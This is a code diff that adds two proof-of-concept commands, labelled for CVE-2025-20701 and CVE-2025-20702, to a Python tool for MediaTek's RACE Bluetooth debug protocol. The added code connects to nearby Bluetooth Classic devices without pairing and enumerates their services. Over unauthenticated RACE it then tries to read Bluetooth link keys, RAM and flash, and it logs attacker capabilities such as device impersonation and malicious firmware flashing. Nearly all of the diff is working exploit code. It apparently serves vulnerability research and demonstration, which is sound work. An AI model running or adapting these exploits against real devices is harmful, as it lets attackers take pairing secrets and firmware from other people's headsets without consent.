@@ -198,6 +198,18 @@ def parse_args():
     # BD addr subcommand
     subparsers.add_parser("bdaddr", help="RACE Get Bluetooth Address Command")
 
+    # Enumerate Classic services subcommand (CVE-2025-20701 PoC)
+    subparsers.add_parser(
+        "enumerate-classic",
+        help="Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC)"
+    )
+
+    # Enumerate RACE protocol subcommand (CVE-2025-20702 PoC)
+    subparsers.add_parser(
+        "enumerate-race",
+        help="Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC)"
+    )
+
     # SDK info subcommand
     subparsers.add_parser("sdkinfo", help="RACE Get SDK Information Command")
 
@@ -669,6 +681,305 @@ async def command_bdaddr(r: RACE, outfile: str):
         logging.info(formatted_address)
 
 
+async def command_enumerate_classic(args: argparse.Namespace):
+    """Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC).
+
+    This command demonstrates the impact of CVE-2025-20701 by connecting to a
+    device via Bluetooth Classic without authentication and enumerating all
+    exposed services via SDP (Service Discovery Protocol).
+    """
+    from bumble.core import BT_BR_EDR_TRANSPORT
+
+    if not args.target_address:
+        logging.error(
+            "--target-address is required for enumerate-classic command")
+        return
+
+    logging.info("=" * 60)
+    logging.info("CVE-2025-20701: Missing BR/EDR Authentication - PoC")
+    logging.info("=" * 60)
+    logging.info("")
+    logging.info(
+        "This vulnerability allows connecting to Bluetooth Classic devices"
+    )
+    logging.info(
+        "WITHOUT pairing. Normally, devices should require user confirmation"
+    )
+    logging.info(
+        "before allowing profile connections. Vulnerable devices skip this."
+    )
+    logging.info("")
+
+    # Release Bluetooth controller
+    release_bluetooth_controller(args.controller)
+
+    # Create checker to connect
+    checker = RFCOMMBumbleChecker(args.controller, args.target_address, False)
+    await checker.setup()
+
+    logging.info("Connecting to %s without authentication...",
+                 args.target_address)
+
+    try:
+        # Connect without authentication
+        if checker.device is None:
+            logging.error("Bluetooth device not initialized")
+            return
+        checker.connection = await checker.device.connect(  # type: ignore[misc]
+            args.target_address, transport=BT_BR_EDR_TRANSPORT
+        )
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        error_str = str(e).lower()
+        logging.error("Connection failed: %s", e)
+        logging.info("")
+
+        if "page_timeout" in error_str:
+            logging.info("PAGE TIMEOUT - The device did not respond.")
+            logging.info("Possible causes:")
+            logging.info("  1. Device is out of range (try moving closer)")
+            logging.info("  2. Device is powered off or in sleep mode")
+            logging.info("  3. Device is not in connectable mode")
+            logging.info("  4. Bluetooth address may be incorrect")
+            logging.info("")
+            logging.info(
+                "Tip: Make sure the target device is awake and nearby.")
+        elif "authentication" in error_str or "rejected" in error_str:
+            logging.info("Connection was REJECTED by the device.")
+            logging.info(
+                "This may mean the device is PATCHED against CVE-2025-20701.")
+        else:
+            logging.info("Connection could not be established.")
+
+        await checker.close()
+        return
+
+    logging.info("Connected successfully WITHOUT pairing!")
+    logging.info("")
+    logging.info("-" * 60)
+    logging.info("IMPACT: The following services are accessible without auth:")
+    logging.info("-" * 60)
+
+    # Get device name
+    try:
+        name = await checker.connection.request_remote_name()
+        logging.info("Device Name: %s", name)
+    except Exception:  # pylint: disable=broad-exception-caught
+        logging.info("Device Name: (could not retrieve)")
+
+    # Enumerate all RFCOMM services
+    from bumble.rfcomm import find_rfcomm_channels
+    from bumble.core import UUID as BumbleUUID
+    channels = await find_rfcomm_channels(checker.connection)
+
+    def format_uuid(uuid_obj) -> str:
+        """Format a UUID object to a readable string with name if known."""
+        if isinstance(uuid_obj, BumbleUUID):
+            # Get the string representation and name
+            uuid_str = str(uuid_obj)
+            if uuid_obj.name and uuid_obj.name != uuid_str:
+                return f"{uuid_obj.name} ({uuid_str})"
+            return uuid_str
+        return str(uuid_obj)
+
+    def format_uuids(uuids) -> str:
+        """Format a list of UUIDs to a readable string."""
+        if isinstance(uuids, list):
+            return ", ".join(format_uuid(u) for u in uuids)
+        return format_uuid(uuids)
+
+    if channels:
+        logging.info("")
+        logging.info("RFCOMM Services (Serial Port Profile):")
+        for channel, service_info in channels.items():
+            uuid_str = format_uuids(
+                service_info) if service_info else "Unknown"
+            logging.info("  Channel %2d: %s", channel, uuid_str)
+
+            # Check if it's a known RACE UUID
+            known_uuid = RFCOMMTransport._matches_any_known_uuid(service_info)
+            if known_uuid:
+                logging.info(
+                    "             ^^^ RACE PROTOCOL EXPOSED! (CVE-2025-20702)")
+    else:
+        logging.info("No RFCOMM services found.")
+
+    # Check for HFP (Hands-Free Profile)
+    logging.info("")
+    logging.info("Checking for common profiles...")
+
+    try:
+        from bumble.hfp import find_hf_sdp_record
+        hfp_record = await find_hf_sdp_record(checker.connection)
+        if hfp_record:
+            channel, _, _ = hfp_record
+            logging.info(
+                "  HFP (Hands-Free Profile): Channel %d - ACCESSIBLE", channel)
+            logging.info("    -> Attacker could intercept/inject audio calls!")
+    except Exception:  # pylint: disable=broad-exception-caught
+        pass
+
+    # Summary
+    logging.info("")
+    logging.info("=" * 60)
+    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20701")
+    logging.info("=" * 60)
+    logging.info("")
+    logging.info(
+        "This device allows Bluetooth Classic connections without pairing.")
+    logging.info("An attacker within Bluetooth range (~10m) can:")
+    logging.info("  1. Connect to the device without user consent")
+    logging.info("  2. Access exposed Bluetooth profiles (HFP, A2DP, etc.)")
+    logging.info(
+        "  3. If RACE is exposed, fully compromise the device (CVE-2025-20702)")
+    logging.info("")
+
+    await checker.close()
+
+
+async def command_enumerate_race(r: RACE):
+    """Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC).
+
+    This command demonstrates the impact of CVE-2025-20702 by connecting to
+    the RACE protocol and enumerating what sensitive data can be accessed.
+    """
+    logging.info("=" * 60)
+    logging.info("CVE-2025-20702: RACE Protocol Exposure - PoC")
+    logging.info("=" * 60)
+    logging.info("")
+    logging.info(
+        "RACE (Relay And Command Engine) is MediaTek's debug/control protocol."
+    )
+    logging.info(
+        "It provides privileged access to device internals including:"
+    )
+    logging.info("  - Reading/writing RAM and Flash memory")
+    logging.info("  - Dumping Bluetooth link keys (device pairing secrets)")
+    logging.info("  - Firmware updates (FOTA)")
+    logging.info("  - Device configuration and diagnostics")
+    logging.info("")
+    logging.info("-" * 60)
+    logging.info("Connecting to RACE protocol...")
+    logging.info("-" * 60)
+
+    try:
+        await r.setup()
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.error("Failed to connect to RACE protocol: %s", e)
+        return
+
+    logging.info("RACE protocol connection established!")
+    logging.info("")
+    logging.info("-" * 60)
+    logging.info("ENUMERATING ACCESSIBLE DATA:")
+    logging.info("-" * 60)
+    logging.info("")
+
+    # Try to get SDK info
+    logging.info("[1] SDK Information:")
+    try:
+        p = GetSDKInfo()
+        res = await r.send_sync(p)
+        sdk_info = res[7:].decode("utf8", errors="replace").strip("\x00")
+        logging.info("    %s", sdk_info)
+        logging.info("    -> ACCESSIBLE")
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.info("    -> Not accessible: %s", e)
+
+    # Try to get build version
+    logging.info("")
+    logging.info("[2] Build Version:")
+    try:
+        p = BuildVersion()
+        res = await r.send_sync(p)
+        build_ver = res[7:].decode("utf8", errors="replace").strip("\x00")
+        logging.info("    %s", build_ver)
+        logging.info("    -> ACCESSIBLE")
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.info("    -> Not accessible: %s", e)
+
+    # Try to get Bluetooth address
+    logging.info("")
+    logging.info("[3] Bluetooth Address:")
+    try:
+        p = GetEDRAddress()
+        res = await r.send_sync(p)
+        addr_pkt = GetEDRAddressResponse.unpack(res)
+        formatted_addr = ":".join(f"{b:02X}" for b in addr_pkt.bd_addr)
+        logging.info("    %s", formatted_addr)
+        logging.info("    -> ACCESSIBLE")
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.info("    -> Not accessible: %s", e)
+
+    # Try to dump link keys (most sensitive!)
+    logging.info("")
+    logging.info("[4] Bluetooth Link Keys (CRITICAL):")
+    try:
+        p = GetLinkKey()
+        res = await r.send_sync(p)
+        if len(res) > 7:
+            link_key_data = res[7:]
+            # Check if there are any link keys
+            if link_key_data and any(b != 0 for b in link_key_data):
+                logging.info("    Found %d bytes of link key data",
+                             len(link_key_data))
+                logging.info("    -> ACCESSIBLE - CRITICAL SECURITY BREACH!")
+                logging.info(
+                    "    -> Attacker can impersonate paired devices!")
+            else:
+                logging.info("    No link keys stored (device not paired)")
+                logging.info("    -> Command accessible, no data present")
+        else:
+            logging.info("    -> Command accessible")
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.info("    -> Not accessible: %s", e)
+
+    # Try to read RAM (sample - first few bytes)
+    logging.info("")
+    logging.info("[5] RAM Access:")
+    try:
+        # Try to read a small chunk from a typical RAM address
+        dumper = RACEDumper(r)
+        sample_data = await dumper.dump(0x04200000, 16)
+        if sample_data:
+            logging.info("    Successfully read 16 bytes from RAM")
+            logging.info("    -> ACCESSIBLE - Full memory read possible!")
+        else:
+            logging.info("    -> Read returned empty data")
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.info("    -> Not accessible: %s", e)
+
+    # Try to read Flash (partition table area)
+    logging.info("")
+    logging.info("[6] Flash Memory Access:")
+    try:
+        flash_dumper = RACEFlashDumper(r, 0x0, 0x100)
+        sample_flash = await flash_dumper.dump()
+        if sample_flash:
+            logging.info("    Successfully read 256 bytes from Flash")
+            logging.info("    -> ACCESSIBLE - Full firmware dump possible!")
+        else:
+            logging.info("    -> Read returned empty data")
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.info("    -> Not accessible: %s", e)
+
+    # Summary
+    logging.info("")
+    logging.info("=" * 60)
+    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20702")
+    logging.info("=" * 60)
+    logging.info("")
+    logging.info("The RACE protocol is exposed without authentication.")
+    logging.info("An attacker can:")
+    logging.info("  1. Read device firmware and extract secrets")
+    logging.info("  2. Dump Bluetooth link keys to impersonate paired devices")
+    logging.info("  3. Read/write device memory for code execution")
+    logging.info("  4. Flash malicious firmware updates")
+    logging.info("")
+    logging.info("Combined with CVE-2025-20701 (no BR/EDR auth), an attacker")
+    logging.info("can fully compromise this device from up to 10 meters away.")
+    logging.info("")
+
+
 async def command_raw(r: RACE, cmd_id: int, outfile: str):
     """Send a raw RACE command with the specified ID."""
     logging.info("Sending raw RACE command")
@@ -854,60 +1165,66 @@ async def main():
 
     setup_logging(args.debug)
 
-    # In the 'check' command we initialize the transport separately
+    # Commands that don't need RACE transport
     if args.command == "check":
         await command_check(args)
-    else:
-        # Initialize the transport class based on the given technology and target UUIDs
-        transport = None
-        try:
-            transport = init_transport(args)
-        except ValueError as e:
-            logging.error("Transport could not be initialized: %s", e)
-            return
+        return
+    if args.command == "enumerate-classic":
+        await command_enumerate_classic(args)
+        return
 
-        r = None
-        try:
-            r = RACE(transport, args.send_delay)
-            if args.command == "ram":
-                await command_ram(r, args.address, args.size, args.outfile, args.debug)
-            elif args.command == "raw":
-                # args.id is fine, it's not a builtin shadow
-                await command_raw(r, args.id, args.outfile)
-            elif args.command == "flash":
-                await command_flash(
-                    r, args.address, args.size, args.outfile, args.debug
-                )
-            elif args.command == "link-keys":
-                await command_link_keys(r, args.outfile)
-            elif args.command == "bdaddr":
-                await command_bdaddr(r, args.outfile)
-            elif args.command == "sdkinfo":
-                await command_sdkinfo(r, args.outfile)
-            elif args.command == "buildversion":
-                await command_buildversion(r, args.outfile)
-            elif args.command == "mediainfo":
-                await command_mediainfo(r)
-            elif args.command == "dump-partition":
-                await command_dump_partition(r, args.outfile)
-            elif args.command == "fota":
-                await command_fota(
-                    r, args.fota_file, args.dont_reflash, args.chunks_per_write
-                )
-        except ConnectionError as e:
-            logging.error("Connection failed: %s", e)
-            # Offer to try alternative transport if using GATT
-            if args.transport.lower() == "gatt" and args.target_address:
-                logging.info(
-                    "Tip: Your device may use Bluetooth Classic. "
-                    "Try: --transport rfcomm --target-address %s",
-                    args.target_address
-                )
-            elif args.transport.lower() == "gatt" and not args.target_address:
-                await _offer_transport_fallback(args, r)
-        finally:
-            if r is not None:
-                await r.close()
+    # Initialize the transport class based on the given technology and target UUIDs
+    transport = None
+    try:
+        transport = init_transport(args)
+    except ValueError as e:
+        logging.error("Transport could not be initialized: %s", e)
+        return
+
+    r = None
+    try:
+        r = RACE(transport, args.send_delay)
+        if args.command == "ram":
+            await command_ram(r, args.address, args.size, args.outfile, args.debug)
+        elif args.command == "raw":
+            # args.id is fine, it's not a builtin shadow
+            await command_raw(r, args.id, args.outfile)
+        elif args.command == "flash":
+            await command_flash(
+                r, args.address, args.size, args.outfile, args.debug
+            )
+        elif args.command == "link-keys":
+            await command_link_keys(r, args.outfile)
+        elif args.command == "bdaddr":
+            await command_bdaddr(r, args.outfile)
+        elif args.command == "sdkinfo":
+            await command_sdkinfo(r, args.outfile)
+        elif args.command == "buildversion":
+            await command_buildversion(r, args.outfile)
+        elif args.command == "mediainfo":
+            await command_mediainfo(r)
+        elif args.command == "enumerate-race":
+            await command_enumerate_race(r)
+        elif args.command == "dump-partition":
+            await command_dump_partition(r, args.outfile)
+        elif args.command == "fota":
+            await command_fota(
+                r, args.fota_file, args.dont_reflash, args.chunks_per_write
+            )
+    except ConnectionError as e:
+        logging.error("Connection failed: %s", e)
+        # Offer to try alternative transport if using GATT
+        if args.transport.lower() == "gatt" and args.target_address:
+            logging.info(
+                "Tip: Your device may use Bluetooth Classic. "
+                "Try: --transport rfcomm --target-address %s",
+                args.target_address
+            )
+        elif args.transport.lower() == "gatt" and not args.target_address:
+            await _offer_transport_fallback(args, r)
+    finally:
+        if r is not None:
+            await r.close()
 
 
 async def _offer_transport_fallback(
